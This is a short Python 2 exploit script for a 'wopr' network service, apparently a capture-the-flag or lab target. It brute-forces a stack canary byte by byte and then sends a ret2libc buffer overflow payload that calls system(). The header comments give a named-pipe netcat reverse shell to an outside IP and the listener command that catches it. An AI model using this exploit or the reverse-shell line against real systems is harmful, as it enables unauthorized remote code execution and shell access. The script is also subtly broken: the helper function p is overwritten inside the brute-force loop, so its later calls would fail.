#!/usr/bin/python
# wopr exploit on target by ev0x
# dont forget to create file /tmp/log
# with the following changing the IP addr
# #!/bin/bash
# mknod backpipe p && nc 172.16.199.138 9999 0<backpipe | /bin/bash 1>backpipe
#
# run another nc listener locally
# nc -lvk 9999
# pop shell and goodness
import socket, re, time, struct

HOST = '127.0.0.1'
PORT = 3333

def p(s):
    return struct.pack("<L", s)

def hitit(pwnd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.send(pwnd)
    data = s.recv(1024)
    for q in range(0, 10):
        data += s.recv(1024)
    s.close()
    return data

cookieoffset = 30
eipoffset = 38

exploit = ""
exploit += "A" * (cookieoffset - len(exploit))
systemadr = p(0x16c210)
exitadr = "DDDD"
cmdadr = p(0x8048c60)

byes = re.compile('bye')

cookie = ""
for z in range(0, 4):
    for x in range(0, 256):
        r = chr(x)
        p = exploit + cookie + r

        tehgoodz = hitit(p)
	if byes.search(tehgoodz, re.IGNORECASE):
	    cookie += r
	    print "byte found {0}".format(r.encode('hex'))
	    print "cookie: {0}".format(cookie.encode('hex'))
	    break

exploit += cookie
exploit += "A" * (eipoffset - len(exploit))
exploit += systemadr
exploit += exitadr
exploit += cmdadr + cmdadr + cmdadr
print "SENDING EXPLOIT"
print exploit
hitit(exploit)
